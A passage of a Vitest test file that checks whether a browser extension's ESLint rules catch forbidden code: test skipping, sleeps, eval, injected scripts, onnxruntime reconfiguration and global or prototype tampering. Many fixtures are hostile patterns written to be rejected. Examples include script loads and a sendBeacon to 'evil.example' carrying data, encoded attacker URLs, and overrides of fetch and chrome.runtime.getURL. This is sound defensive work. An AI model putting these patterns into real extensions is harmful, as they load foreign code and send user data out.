import { ESLint, Linter } from 'eslint';
import { join } from 'node:path';
import tseslint from 'typescript-eslint';
import { describe, expect, it } from 'vitest';
import { fontsnapPlugin } from '../../eslint.config.js';

// What guards.test.ts cannot show: that the selectors in eslint.config.js really match the code
// they are meant to stop. The config itself (rules and options) is pinned by the guard snapshots.

const eslint = new ESLint();
const RULES = ['no-restricted-syntax', 'no-restricted-properties', 'no-restricted-imports'];

/** Messages of the restriction rules, as configured for `file` in eslint.config.js, for `code`. */
async function flagged(file: string, code: string): Promise<string[]> {
  const config = (await eslint.calculateConfigForFile(file)) as {
    rules?: Record<string, Linter.RuleEntry>;
  };
  const rules = Object.fromEntries(
    RULES.flatMap((name) => {
      const entry = config.rules?.[name];
      return entry === undefined ? [] : [[name, entry] as const];
    }),
  );
  expect(Object.keys(rules), `${file} has restriction rules`).not.toEqual([]);
  const messages = new Linter().verify(
    code,
    [
      {
        files: ['**/*.ts'],
        languageOptions: { parser: tseslint.parser },
        plugins: { fontsnap: fontsnapPlugin },
        rules,
      },
    ],
    join(process.cwd(), file),
  );
  return messages.map((message) => message.message);
}

const TEST_FILES = [
  'tests/e2e/welcome.spec.ts',
  'tests/unit/ui.test.ts',
  'tests/unit/helpers/chrome-stub.ts',
  'tests/support/anything.ts',
];

describe('test code: modifiers, conditional registration, aliases', () => {
  it.each([
    "test.fixme('x', () => undefined);",
    "test.skip('x', () => undefined);",
    "test.only('x', () => undefined);",
    "test.fail('x', () => undefined);",
    "it.skipIf(true)('x', () => undefined);",
    "it.runIf(false)('x', () => undefined);",
    "it.todo('x');",
    "it.fails('x', () => undefined);",
    "it.skip('x', () => undefined);",
    "describe.only('x', () => undefined);",
    "describe.skipIf(true)('x', () => undefined);",
    "suite.skip('x', () => undefined);",
    "test.describe.skip('x', () => undefined);",
    "test.describe.fixme('x', () => undefined);",
    "test.step.skip('x', () => undefined);",
    "test['skip']('x', () => undefined);",
    "playwright.test.skip('x', () => undefined);",
    'const { skip } = test;',
    'const { fixme } = test.describe;',
    'const { step } = test;',
    'const alias = test;',
    'const t2 = it;',
    'const steps = test.step;',
    'const t3 = playwright.test;',
    'let t4; t4 = test;',
    "import { test as t } from '@playwright/test';",
    "import { it as t } from 'vitest';",
    "if (process.env.X) { it('x', () => undefined); }",
    "const run = flag ? it : undefined; flag && test('x', () => undefined);",
    "if (flag) { test.describe('x', () => undefined); }",
    "switch (a) { case 1: it('x', () => undefined); }",
  ])('flags %s', async (code) => {
    for (const file of TEST_FILES) expect(await flagged(file, code), file).not.toEqual([]);
  });

  it.each([
    'test.describe.configure({ retries: 2 });',
    "test.describe.configure({ mode: 'serial', retries: 2 });",
    'test.describe.configure({ timeout: 1000 });',
    'test.describe.configure({ ...options });',
    'test.describe.configure(options);',
    "test.describe.configure({ ['retries']: 2 });",
    'describe.configure({ retries: 2 });',
  ])('flags %s (configure may only set mode)', async (code) => {
    for (const file of TEST_FILES) expect(await flagged(file, code), file).not.toEqual([]);
  });

  it('still allows the ordinary test API, slow(), setTimeout() and configure({ mode })', async () => {
    const code = [
      "test.describe('group', () => { test.use({ uiLocale: 'ru' }); });",
      "test.describe.configure({ mode: 'serial' });",
      "test('x', async ({ page }, testInfo) => { test.slow(); test.setTimeout(60_000); testInfo.setTimeout(1000); });",
      "it.each([1, 2])('n %i', () => undefined);",
      "describe('y', () => { it('z', () => undefined); });",
      "test('s', async () => { await test.step('inner', async () => undefined); });",
      'export const extended = playwright.test.extend({});',
    ].join('\n');
    for (const file of TEST_FILES) expect(await flagged(file, code), file).toEqual([]);
  });
});

describe('test code: no sleeping by any route, wherever the file lives under tests/', () => {
  it.each([
    'await page.waitForTimeout(500);',
    "await page['waitForTimeout'](500);",
    'await page[`waitForTimeout`](500);',
    'const { waitForTimeout } = page;',
    'const timer = globalThis.setTimeout.bind(globalThis);',
    'await new Promise((done) => window.setTimeout(done, 5));',
    "await new Promise((done) => globalThis['setTimeout'](done, 5));",
    'const nap = setTimeout;',
    'setInterval(() => undefined, 5);',
    'setImmediate(() => undefined);',
    "import { setTimeout as sleep } from 'node:timers/promises';",
    "import { setTimeout } from 'timers';",
    "import timers from 'node:timers';",
    "import { scheduler } from 'timers/promises';",
    "const { scheduler } = await import('node:timers/promises');",
    "const m = import('./anything');",
    "await page.waitForLoadState('networkidle');",
  ])('flags %s', async (code) => {
    for (const file of TEST_FILES) expect(await flagged(file, code), file).not.toEqual([]);
  });

  it('keeps e2e tests from importing unit-test helpers (which are not covered by the e2e rules)', async () => {
    expect(
      await flagged('tests/e2e/welcome.spec.ts', "import { pause } from '../unit/helpers/pause';"),
    ).not.toEqual([]);
  });
});

describe('extension code: boundaries, loading, number formatting and ambient declarations', () => {
  it.each([
    ['src/result/render.ts', "import { readFileSync } from 'fs';"],
    ['src/result/render.ts', "import { readFile } from 'fs/promises';"],
    ['src/result/render.ts', "import { readFile } from 'node:fs/promises';"],
    ['src/result/app.ts', "import { x } from '../background/handlers';"],
    ['src/shared/i18n.ts', "import { x } from '../result/render';"],
    ['src/welcome/app.ts', "await import('../result/render');"],
    ['src/result/render.ts', "new Intl.NumberFormat('en').format(1);"],
    ['src/result/render.ts', 'const { NumberFormat } = Intl;'],
    ['src/result/render.ts', 'const text = (5).toFixed(1);'],
    ['src/result/render.ts', "el.textContent = 'Hello';"],
    ['src/result/render.ts', 'declare const require: (name: string) => unknown;'],
    ['src/result/render.ts', "declare module 'fs' { export const a: number; }"],
    ['src/result/render.ts', "const fs = require('fs');"],
    // code loaded or built at run time, which no lint, type or coverage check can look into
    ['src/result/app.ts', "const s = doc.createElement('script'); doc.head.append(s);"],
    ['src/result/app.ts', "doc.body.append(doc.createElement('IFRAME'));"],
    ['src/result/app.ts', "document.createElement('embed');"],
    ['src/result/app.ts', "document.createElement('object');"],
    ['src/result/app.ts', "eval('1');"],
    ['src/result/app.ts', "new Function('return 1')();"],
    ['src/select/overlay.ts', "importScripts('x.js');"],
    ['src/select/overlay.ts', "document.write('<p>x</p>');"],
    ['src/shared/format.ts', "document.createElement('script');"],
    ['src/env.d.ts', "document.createElement('script');"],
  ])('%s rejects %s', async (file, code) => {
    expect(await flagged(file, code)).not.toEqual([]);
  });

  // Round 8: the same ideas spelled differently. Each of these slipped through the first selectors.
  it.each([
    ['a template literal', 'document.createElement(`script`);'],
    ['a template literal, upper case', 'document.createElement(`SCRIPT`);'],
    ['createElementNS', "document.createElementNS('http://www.w3.org/1999/xhtml', 'script');"],
    [
      'createElementNS, svg namespace',
      "document.createElementNS('http://www.w3.org/2000/svg', 'script');",
    ],
    ['createElementNS, template literal', 'document.createElementNS(ns, `script`);'],
    ['a computed member', "document['createElement']('script');"],
    ['a computed member, template literal', 'document[`createElement`](`iframe`);'],
    ['globalThis.eval', "globalThis.eval('1');"],
    ['window.eval', "window.eval('1');"],
    ['self.eval', "self.eval('1');"],
    ['a computed globalThis.eval', "globalThis['eval']('1');"],
    ['self.importScripts', "self.importScripts('x.js');"],
    ['globalThis.importScripts', "globalThis.importScripts('x.js');"],
    ['new globalThis.Function', "new globalThis.Function('return 1');"],
    ['an indirect eval', "(0, eval)('1');"],
    ['an aliased eval', 'const run = eval; run("1");'],
    ['Function called without new', "Function('return 1')();"],
    ['setTimeout with code in a string', "setTimeout('alert(1)', 0);"],
    ['setInterval with code in a template', 'setInterval(`alert(1)`, 0);'],
    ['window.setTimeout with a string', "window.setTimeout('alert(1)', 0);"],
    ['document.writeln', "document.writeln('<p>x</p>');"],
    ['WebAssembly.instantiate', 'WebAssembly.instantiate(bytes);'],
    ['new WebAssembly.Module', 'new WebAssembly.Module(bytes);'],
    ['globalThis.WebAssembly', 'globalThis.WebAssembly.compile(bytes);'],
    ['an alias of WebAssembly', 'const wasm = WebAssembly; wasm.validate(bytes);'],
  ])('rejects %s in extension code', async (_name, code) => {
    expect(await flagged('src/result/app.ts', code), code).not.toEqual([]);
  });

  // Round 9: the Function constructor reached without the name Function, and string code to a timer
  // through a computed member; document.write through any object or computed member.
  it.each([
    ['the constructor of an arrow function', "(() => undefined).constructor('alert(1)')();"],
    ['x.constructor(...)', "x.constructor('alert(1)');"],
    ["x['constructor'](...)", "x['constructor']('alert(1)');"],
    ['x[`constructor`](...)', "x[`constructor`]('alert(1)');"],
    ['new x.constructor(...)', "new x.constructor('alert(1)');"],
    ['an async function constructor', "(async () => undefined).constructor('alert(1)');"],
    ["window['setTimeout']('code')", "window['setTimeout']('alert(1)', 0);"],
    ['self[`setInterval`](`code`)', 'self[`setInterval`](`alert(1)`, 0);'],
    ["globalThis['setTimeout']('code')", "globalThis['setTimeout']('alert(1)');"],
    ['doc.write', "doc.write('<p>x</p>');"],
    ['document.write', "document.write('<p>x</p>');"],
    ["document['write']", "document['write']('<p>x</p>');"],
    ["document['writeln']", "document['writeln']('<p>x</p>');"],
    ['document[`write`]', "document[`write`]('<p>x</p>');"],
    ['writeln on any object', "d.writeln('<p>x</p>');"],
    ['ownerDocument.write', "el.ownerDocument.write('<p>x</p>');"],
    ['an alias of document.write', "const d = document; d.write('<p>x</p>');"],
    ['a dynamic key and the in operator', 'if (key in table) run();'],
    ['the in operator on a member', 'if (name in this.table) run();'],
  ])('rejects %s in extension code', async (_name, code) => {
    expect(await flagged('src/result/app.ts', code), code).not.toEqual([]);
  });

  it('allows the in operator with a literal key (narrowing a union), classes, and plain constructors', async () => {
    const code = [
      "if ('documentElement' in root) run();",
      'class A { constructor() { this.x = 1; } }',
      'const kind = this.constructor.name;',
      'const o = { constructor: 1, write: 2 };',
      'const s = new Set<string>(); s.has(key);',
    ].join('\n');
    expect(await flagged('src/result/render.ts', code)).toEqual([]);
  });

  it.each([
    ['scripts/lib/locales.ts', 'if (key in reference) run();'],
    ['scripts/lib/dist.ts', 'return name in table;'],
    ['vite.shared.ts', 'if (key in table) run();'],
  ])(
    '%s rejects the in operator with a dynamic key: use a Map, a Set or Object.hasOwn',
    async (file, code) => {
      expect(await flagged(file, code), code).not.toEqual([]);
    },
  );

  it('allows the in operator with a literal key in scripts', async () => {
    expect(await flagged('scripts/lib/tag.ts', "return 'error' in result;")).toEqual([]);
  });

  it('still lets code use timers with functions, and look at element names it does not create', async () => {
    const code = [
      'setTimeout(() => undefined, 5);',
      'window.setTimeout(callback, 5);',
      "const tag = el.tagName === 'SCRIPT';",
      "document.createElement('li');",
      'document.createElementNS(ns, `circle`);',
      'const evaluate = (x: number) => x;',
    ].join('\n');
    expect(await flagged('src/result/render.ts', code)).toEqual([]);
  });

  it('still lets code create ordinary elements', async () => {
    expect(await flagged('src/result/render.ts', "doc.createElement('li');")).toEqual([]);
  });

  it('lets format.ts, and only format.ts, use Intl.NumberFormat', async () => {
    const code = "new Intl.NumberFormat('en');";
    expect(await flagged('src/shared/format.ts', code)).toEqual([]);
    expect(await flagged('src/shared/settings.ts', code)).not.toEqual([]);
  });

  it('allows ambient declarations in .d.ts files', async () => {
    const code = "declare module '*.svg' { const url: string; export default url; }";
    expect(await flagged('src/env.d.ts', code)).toEqual([]);
  });
});

// onnxruntime-web can be pointed at other code through its environment: env.wasm.wasmPaths (another URL, a different
// .wasm) and env.wasm.wasmBinary (other bytes) run WebAssembly past the pinned files of scripts/lib/vendor.ts, with
// every build check green. So only src/result/model.ts, which a test pins line by line, may touch the runtime at all.
describe('onnxruntime-web is configured in src/result/model.ts and nowhere else', () => {
  const ORT_FILES = [
    'src/result/app.ts',
    'src/result/render.ts',
    'src/background/handlers.ts',
    'src/background/shot.ts',
    'src/shared/capture.ts',
    'src/shared/core/pipeline.ts',
    'src/select/overlay.ts',
    'src/welcome/app.ts',
    'src/manifest.ts',
    'src/env.d.ts',
  ];

  it.each([
    ['a member access', "ort.env.wasm.wasmPaths = 'https://cdn.example.com/ort/';"],
    ['wasmBinary', 'ort.env.wasm.wasmBinary = bytes;'],
    ['an object as wasmPaths', 'ort.env.wasm.wasmPaths = { wasm: url, mjs: url };'],
    ['an object key', "const options = { wasmPaths: 'https://cdn.example.com/' };"],
    ['a string key', "const options = { 'wasmBinary': bytes };"],
    ['a shorthand property', 'const wasmPaths = url; use({ wasmPaths });'],
    ['a destructured name', 'const { wasmBinary } = env.wasm;'],
    ['a renamed destructured name', 'const { wasmPaths: where } = settings;'],
    ['a computed string', "ort.env.wasm['wasmBinary'] = bytes;"],
    ['a computed template', 'ort.env.wasm[`wasmPaths`] = url;'],
    ['a template as a key', 'const o = { [`wasmBinary`]: bytes };'],
    ['reading it', 'const where = ort.env.wasm.wasmPaths;'],
    ['Object.assign on the environment', 'Object.assign(ort.env.wasm, config);'],
    ['Reflect.set with a string', "Reflect.set(ort.env.wasm, 'wasmBinary', bytes);"],
    ['the env of a destructured import', "const { env } = await load('x');"],
    ['an env member', 'globalThis.ort.env.wasm.numThreads = 8;'],
    ['a computed env', "ort['env'].wasm.numThreads = 8;"],
    ['an import of onnxruntime-web', "import * as ort from 'onnxruntime-web/wasm';"],
    ['another entry point', "import * as ort from 'onnxruntime-web';"],
    ['onnxruntime-node', "import * as ort from 'onnxruntime-node';"],
    ['a named import', "import { env } from 'onnxruntime-web/wasm';"],
    ['a re-export', "export * from 'onnxruntime-web/wasm';"],
    ['a named re-export', "export { env } from 'onnxruntime-web/wasm';"],
  ])('rejects %s', async (_name, code) => {
    for (const file of ORT_FILES)
      expect(await flagged(file, code), `${file}: ${code}`).not.toEqual([]);
  });

  it('is not tied to one spelling: the names are matched as identifiers, strings and templates', async () => {
    for (const code of ['x.wasmPaths', "x['wasmPaths']", 'x[`wasmBinary`]', '({ wasmBinary })']) {
      expect(await flagged('src/result/app.ts', code), code).not.toEqual([]);
    }
  });

  it('lets src/result/model.ts do exactly what it does today', async () => {
    const code = [
      "import * as ort from 'onnxruntime-web/wasm';",
      "ort.env.wasm.wasmPaths = chrome.runtime.getURL('ort/');",
      'ort.env.wasm.numThreads = 1;',
    ].join('\n');
    expect(await flagged('src/result/model.ts', code)).toEqual([]);
  });

  it('still applies every other src rule to src/result/model.ts', async () => {
    for (const code of [
      "eval('1');",
      'WebAssembly.compile(bytes);',
      "document.createElement('script');",
    ]) {
      expect(await flagged('src/result/model.ts', code), code).not.toEqual([]);
    }
  });

  it('does not touch ordinary code that merely looks similar', async () => {
    const code = [
      'const environment = 1;',
      'const wasmPathsCount = 2;',
      "const label = 'environment';",
      'const o = { envelope: 1, binary: 2 };',
    ].join('\n');
    expect(await flagged('src/result/app.ts', code)).toEqual([]);
  });
});

// The runtime fetches its .wasm through the global fetch and compiles it with the global WebAssembly (round 2 of the review
// of PR #6): replacing either, or the prototypes they rely on, loads other bytes with every other check green. So src/
// (model.ts included) may not write to the global objects, to host objects (chrome, navigator, ...) or to prototypes, and
// may not use the primitives that do it.
describe('extension code does not tamper with globals, host objects or prototypes', () => {
  const FILES = [
    'src/result/app.ts',
    'src/result/render.ts',
    'src/result/model.ts',
    'src/background/handlers.ts',
    'src/background/shot.ts',
    'src/shared/capture.ts',
    'src/shared/core/pipeline.ts',
    'src/select/overlay.ts',
    'src/welcome/app.ts',
    'src/manifest.ts',
    'src/env.d.ts',
  ];

  it.each([
    ['assigning globalThis.fetch', 'globalThis.fetch = (u: string) => realFetch(other(u));'],
    ['self.fetch', 'self.fetch = patched;'],
    ['window.fetch', 'window.fetch = patched;'],
    ['a computed string', "globalThis['fetch'] = patched;"],
    ['a computed template', 'globalThis[`fetch`] = patched;'],
    ['a computed name', 'globalThis[name] = patched;'],
    ['a nested write', 'globalThis.WebAssembly.instantiateStreaming = patched;'],
    ['a deep write', 'self.crypto.subtle.digest = patched;'],
    ['an update', 'globalThis.counter++;'],
    ['a compound assignment', 'globalThis.log += "x";'],
    ['a delete', 'delete globalThis.fetch;'],
    ['a write to an allowed read', 'globalThis.crypto = fake;'],
    ['a bare assignment of fetch', 'fetch = patched;'],
    ['a bare assignment of Response', 'Response = Fake;'],
    ['a destructuring write', '({ f: globalThis.fetch } = { f: patched });'],
    ['an array destructuring write', '[self.fetch] = [patched];'],
    ['Object.defineProperty', "Object.defineProperty(globalThis, 'fetch', { value: patched });"],
    [
      'Object.defineProperty on a prototype',
      "Object.defineProperty(Response.prototype, 'arrayBuffer', { value: patched });",
    ],
    ['Object.defineProperties', 'Object.defineProperties(window, descriptors);'],
    [
      'an alias of defineProperty',
      "const define = Object['defineProperty']; define(globalThis, 'fetch', d);",
    ],
    ['Reflect.set', "Reflect.set(globalThis, 'fetch', patched);"],
    ['Reflect.defineProperty', "Reflect.defineProperty(self, 'fetch', d);"],
    ['Reflect.get(...).call', "Reflect.get(globalThis, 'fetch').call(globalThis, url);"],
    ['Object.assign on a global', 'Object.assign(globalThis, { fetch: patched });'],
    ['Object.assign on window', 'Object.assign(window, patch);'],
    ['an alias of globalThis', 'const g = globalThis; g.fetch = patched;'],
    ['an alias of self', 'const g = self; use(g);'],
    ['an alias of window', 'let w; w = window;'],
    ['passing globalThis on', 'install(globalThis);'],
    ['a spread of the global', 'const copy = { ...globalThis };'],
    ['with', 'with (globalThis) { fetch = patched; }'],
    ['an optional write chain', 'globalThis.a.b.c = 1;'],
    ['Object.setPrototypeOf', 'Object.setPrototypeOf(globalThis, evil);'],
    ['__proto__', 'x.__proto__ = evil;'],
    ['__proto__ in a literal', 'const o = { __proto__: evil };'],
    ['a prototype write', 'Response.prototype.arrayBuffer = patched;'],
    ['a prototype method', 'Promise.prototype.then = patched;'],
    ['the prototype of an instance', 'x.constructor.prototype.y = 1;'],
    ['a computed prototype', "Array['prototype'].push = patched;"],
    ['getPrototypeOf', 'Object.getPrototypeOf(ort.env.wasm).wasmBinary = bytes;'],
    ['Proxy', 'globalThis.fetch;\nnew Proxy(target, handler);'],
    ['__defineGetter__', "x.__defineGetter__('wasmBinary', () => bytes);"],
    ['a write to chrome', "chrome.runtime.getURL = () => 'https://evil.example/ort/';"],
    ['a write below chrome', 'chrome.runtime.id = "x";'],
    ['a write to navigator', 'navigator.hardwareConcurrency = 1;'],
    ['a write to performance', 'performance.getEntriesByType = () => [];'],
    ['a write to Object', 'Object.hasOwn = () => true;'],
    ['a write to a native static', 'JSON.parse = patched;'],
    ['a write to Math', 'Math.min = patched;'],
    ['a write to URL', 'URL.createObjectURL = patched;'],
    [
      'Object.assign on chrome.runtime',
      "Object.assign(chrome.runtime, { getURL: () => 'https://evil.example/' });",
    ],
    ['Object.assign on a deeper host member', 'Object.assign(chrome.runtime.onMessage, patch);'],
    ['Object.assign on navigator', 'Object.assign(navigator, { hardwareConcurrency: 1 });'],
    ['Object.assign on a native', 'Object.assign(Response, patch);'],
    ['Object.assign on performance', 'Object.assign(performance, { getEntriesByType: () => [] });'],
    ['Object.assign on fetch', 'Object.assign(fetch, patch);'],
  ])('rejects %s', async (_name, code) => {
    for (const file of FILES) expect(await flagged(file, code), `${file}: ${code}`).not.toEqual([]);
  });

  it.each([
    'const isolated = globalThis.crossOriginIsolated;',
    'const id = globalThis.crypto.randomUUID();',
    'const ratio = window.devicePixelRatio || 1;',
    'startSelection(window);',
    'initWelcome(document);',
    "doc.title = 'x'; el.style.width = '1px'; el.textContent = text;",
    "Object.assign(el.style, { left: '1px' });",
    "const url = chrome.runtime.getURL('x');",
    'await navigator.clipboard.writeText(css);',
    'const n = Object.keys(o).length + Object.entries(o).length;',
    "if (Object.hasOwn(o, 'k')) run();",
    'const p = Promise.resolve(1);',
    'class Box { value = 1; }',
    'const f = (x: string) => x.prototypeless;',
  ])('lets ordinary code through: %s', async (code) => {
    for (const file of ['src/result/app.ts', 'src/result/model.ts', 'src/select/overlay.ts']) {
      expect(await flagged(file, code), `${file}: ${code}`).toEqual([]);
    }
  });

  it('applies to src/result/model.ts too, the one file that may configure the runtime', async () => {
    expect(await flagged('src/result/model.ts', 'globalThis.fetch = patched;')).not.toEqual([]);
    expect(
      await flagged('src/result/model.ts', "Object.defineProperty(globalThis, 'fetch', d);"),
    ).not.toEqual([]);
    expect(await flagged('src/result/model.ts', 'ort.env.wasm.wasmPaths = runtimeUrl();')).toEqual(
      [],
    );
  });
});

// Round 3 of the review of PR #6: denying the spellings that reach or write the global object was a list that was completed
// three times (Object.assign(document.defaultView, { fetch }), top, parent, ...). src/ now reaches the environment through an
// ALLOWLIST (GLOBAL_ACCESS in eslint.config.js): a global that is not named there cannot be used, a restricted one only through
// its listed members, and never written, aliased, destructured, computed or passed on.
describe('src/ reaches the environment only through the allowlist of globals', () => {
  // the names the fixtures use freely; they are declared, so that only real globals are "global" for the rule
  const FREE_NAMES = `declare let ${[
    'Other',
    'blob',
    'css',
    'data',
    'd',
    'doc',
    'el',
    'event',
    'frame',
    'handler',
    'iframe',
    'key',
    'name',
    'node',
    'o',
    'other',
    'patched',
    'render',
    'rows',
    's',
    'sender',
    'stop',
    'tab',
    'target',
    'text',
    'u',
    'url',
    'use',
    'v',
    'w',
    'x',
    'y',
    'run',
    'b',
    'evil',
    'startSelection',
  ].join(', ')}: any;`;
  /** Messages of the allowlist rule alone, for `code` as if it were the file `file` (the DOM types are known). */
  async function reached(file: string, code: string): Promise<string[]> {
    const config = (await eslint.calculateConfigForFile(file)) as {
      rules?: Record<string, Linter.RuleEntry>;
    };
    const entry = config.rules?.['fontsnap/global-access'];
    expect(entry, `${file} is held to the allowlist`).toBeDefined();
    return new Linter()
      .verify(
        `${FREE_NAMES}\n${code}`,
        [
          {
            files: ['**/*.ts'],
            languageOptions: {
              parser: tseslint.parser,
              parserOptions: { lib: ['esnext', 'dom', 'dom.iterable'] },
            },
            plugins: { fontsnap: fontsnapPlugin },
            rules: { 'fontsnap/global-access': entry ?? 'off' },
          },
        ],
        join(process.cwd(), file),
      )
      .map((message) => message.message);
  }
  /** Both rules: the allowlist and the restrictions on properties that hand over a Window. */
  async function either(file: string, code: string): Promise<string[]> {
    return [...(await reached(file, code)), ...(await flagged(file, code))];
  }

  const FILES = [
    'src/result/render.ts',
    'src/result/index.ts',
    'src/background/handlers.ts',
    'src/shared/capture.ts',
    'src/shared/ui.ts',
    'src/welcome/mode.ts',
    'src/select/overlay.ts',
    'src/result/model.ts',
  ];

  it.each([
    // the window through an alias or a property (C1 of the review)
    ['document.defaultView in Object.assign', 'Object.assign(document.defaultView, { fetch });'],
    ['top', 'Object.assign(top as object, { fetch });'],
    ['parent', 'Object.assign(parent as object, { fetch });'],
    ['frames', 'Object.assign(frames[0] as object, { fetch });'],
    ['opener', 'const o = opener;'],
    ['frameElement', 'const f = frameElement;'],
    ['globalThis.self', 'const w = globalThis.self;'],
    ['window.window', 'const w = window.window;'],
    ['an alias of defaultView', 'const w = document.defaultView; w.fetch = patched;'],
    ['a destructured defaultView', 'const { defaultView } = document;'],
    ['a destructured fetch', 'const { fetch } = globalThis;'],
    ['a renamed destructured defaultView', 'const { defaultView: w } = document;'],
    ['a computed defaultView', "const w = document['defaultView'];"],
    ['a template defaultView', 'const w = document[`defaultView`];'],
    ['ownerDocument.defaultView', 'const w = node.ownerDocument.defaultView;'],
    ['Reflect.set on an alias', "Reflect.set(document.defaultView as object, 'fetch', patched);"],
    ['defineProperty on a frame', "Object.defineProperty(frame.contentWindow, 'fetch', d);"],
    ['setPrototypeOf on an alias', 'Object.setPrototypeOf(w, evil);'],
    ['iframe.contentWindow', 'const w = iframe.contentWindow;'],
    ['MessageEvent.source', 'const w = event.source;'],
    ['UIEvent.view', 'const w = event.view;'],
    ['event.currentTarget', 'const w = event.currentTarget;'],
    ['event.relatedTarget', 'const w = event.relatedTarget;'],
    ['composedPath', 'const path = event.composedPath();'],
    ['event.target read', 'const t = event.target;'],
    ['event.target destructured', 'const { target } = event;'],
    ['getBackgroundPage', 'const w = await chrome.runtime.getBackgroundPage();'],
    ['extension getViews', 'const ws = chrome.extension.getViews();'],
    ['the Window type', 'function f(w: Window) { return w; }'],
    ['typeof globalThis', 'function f(w: typeof globalThis) { return w; }'],
    ['a message source type', 'function f(w: MessageEventSource) { return w; }'],
    ['Object.assign on anything but a style', 'Object.assign(target, { a: 1 });'],
    // resource timing (C2 of the review)
    ['setResourceTimingBufferSize', 'performance.setResourceTimingBufferSize(0);'],
    ['clearResourceTimings', 'performance.clearResourceTimings();'],
    ['performance.mark', "performance.mark('x');"],
    ['performance.now', 'const t = performance.now();'],
    ['an alias of performance', 'const p = performance;'],
    // ways to build or hide a URL, and to leave the page's own fetch
    ['atob', "const u = atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUv');"],
    ['btoa', "const b = btoa('x');"],
    ['decodeURI', "const u = decodeURI('%68ttps://evil.example/');"],
    ['decodeURIComponent', "const u = decodeURIComponent('%68ttps://evil.example/');"],
    ['unescape', "const u = unescape('%68ttps://evil.example/');"],
    ['String.fromCharCode', 'const c = String.fromCharCode(104, 116, 116, 112);'],
    ['String.fromCodePoint', 'const c = String.fromCodePoint(104);'],
    ['String.raw', 'const c = String.raw`a`;'],
    ['TextDecoder', 'const d = new TextDecoder();'],
    ['Worker', "const w = new Worker('https://evil.example/w.js');"],
    ['SharedWorker', "const w = new SharedWorker('w.js');"],
    ['importScripts', "importScripts('https://evil.example/x.js');"],
    ['XMLHttpRequest', 'const x = new XMLHttpRequest();'],
    ['EventSource', "const e = new EventSource('https://evil.example/');"],
    ['WebSocket', "const w = new WebSocket('wss://evil.example/');"],
    ['sendBeacon', "navigator.sendBeacon('https://evil.example/', data);"],
    ['navigator.webdriver', 'if (navigator.webdriver) run();'],
    ['navigator.serviceWorker', 'const sw = navigator.serviceWorker;'],
    ['queueMicrotask', 'queueMicrotask(run);'],
    ['WebAssembly', 'const w = WebAssembly;'],
    ['Reflect', 'const r = Reflect;'],
    ['Proxy', 'const p = new Proxy({}, {});'],
    ['JSON', 'const o = JSON.parse(text);'],
    ['Intl', 'const f = new Intl.NumberFormat();'],
    ['crypto', 'const id = crypto.randomUUID();'],
    ['location', 'const h = location.href;'],
    ['localStorage', "localStorage.setItem('a', 'b');"],
    // chrome: only the listed members
    ['an alias of chrome', 'const c = chrome;'],
    ['a destructured chrome', 'const { runtime } = chrome;'],
    ['chrome passed on', 'use(chrome);'],
    ['a computed chrome member', 'const g = chrome[name];'],
    ['chrome.runtime alone', 'const r = chrome.runtime;'],
    ['chrome.runtime.connect', 'chrome.runtime.connect();'],
    ['chrome.runtime.getURL alone as a value', 'const g = chrome.runtime;'],
    ['chrome.webRequest', 'chrome.webRequest.onBeforeRequest.addListener(f, {});'],
    ['chrome.storage.local', 'await chrome.storage.local.get();'],
    ['chrome.declarativeNetRequest', 'chrome.declarativeNetRequest.updateDynamicRules({});'],
    ['chrome.debugger', 'chrome.debugger.attach({}, "1.3");'],
    // writes to what is allowed
    ['a write to chrome.runtime.getURL', "chrome.runtime.getURL = () => 'https://evil.example/';"],
    ['a write to Math', 'Math.max = patched;'],
    ['a write to Object', 'Object.hasOwn = patched;'],
    ['a write to Promise', 'Promise.resolve = patched;'],
    ['a write to document', "document.title = 'x'; document.body = other;"],
    ['a write to navigator', 'navigator.hardwareConcurrency = 1;'],
    ['an update of an allowed global', 'Date.now++;'],
    ['a delete', 'delete Array.isArray;'],
    ['a destructuring write', '({ a: Math.max } = o);'],
    ['an assignment to a bare global', 'Map = Other;'],
  ])('rejects %s', async (_name, code) => {
    // not shared/capture.ts: it is the one file with decodeURIComponent and globalThis.crypto
    for (const file of FILES.filter((name) => name !== 'src/shared/capture.ts').slice(0, 4)) {
      expect(await either(file, code), `${file}: ${code}`).not.toEqual([]);
    }
  });

  it.each([
    "const url = chrome.runtime.getURL('x'); const id = chrome.runtime.id;",
    'chrome.runtime.onMessage.addListener(handler); chrome.runtime.onInstalled.addListener(handler);',
    'await chrome.storage.session.set({ a: 1 }); await chrome.storage.session.remove("a");',
    'await chrome.tabs.captureVisibleTab({ format: "png" });',
    'chrome.action.onClicked.addListener(handler); await chrome.action.getUserSettings();',
    'chrome.contextMenus.removeAll(); chrome.contextMenus.create({ id: "a" });',
    'const text = chrome.i18n.getMessage(key); const lang = chrome.i18n.getUILanguage();',
    "await chrome.scripting.executeScript({ target: { tabId: 1 }, files: ['select.js'] });",
    "const g = chrome['runtime'].getURL('x');",
    'const t: chrome.tabs.Tab | undefined = tab; const s: chrome.runtime.MessageSender = sender;',
    'const n = Math.min(1, 2) + Number(x) + Number.isFinite(y) + Date.now();',
    'const a = Array.isArray(v) ? new Map<string, number>() : new Set<string>();',
    'const e = new Error(String(v)); const r = new RangeError("x");',
    'const f = new Float32Array(2); const u = new Uint8ClampedArray(2); const i = new Int32Array(1);',
    "if (Object.hasOwn(o, 'k')) run(Object.entries(o));",
    'const el = document.createElement("div"); document.body.append(el); el.textContent = text;',
    'await navigator.clipboard.writeText(css); const n = navigator.hardwareConcurrency || 1;',
    'const p = new Promise<void>((resolve) => setTimeout(resolve, 0)); requestAnimationFrame(run);',
    'const timer = setInterval(run, 1500); clearInterval(timer);',
    'const bmp = await createImageBitmap(blob); const c = new OffscreenCanvas(1, 1);',
    'const q = new URLSearchParams(s); const e = encodeURIComponent(x);',
    'const w = NodeFilter.SHOW_TEXT; const n = NaN + Infinity;',
    'const copy = new Uint8Array(b); const same = x === undefined;',
  ])('lets what src/ really does through: %s', async (code) => {
    for (const file of FILES.slice(0, 4)) {
      expect(await reached(file, code), `${file}: ${code}`).toEqual([]);
    }
  });

  it('gives each file only the extra names it needs', async () => {
    // content script of the selection overlay: its own Window
    expect(await either('src/select/index.ts', 'startSelection(window);')).toEqual([]);
    expect(await reached('src/result/render.ts', 'startSelection(window);')).not.toEqual([]);
    expect(
      await reached('src/select/overlay.ts', 'function f(win: Window) { return win; }'),
    ).toEqual([]);
    expect(
      await reached('src/result/app.ts', 'function f(win: Window) { return win; }'),
    ).not.toEqual([]);
    expect(
      await reached('src/select/overlay.ts', "Object.assign(el.style, { left: '1px' });"),
    ).toEqual([]);
    // the screenshot of the service worker
    expect(
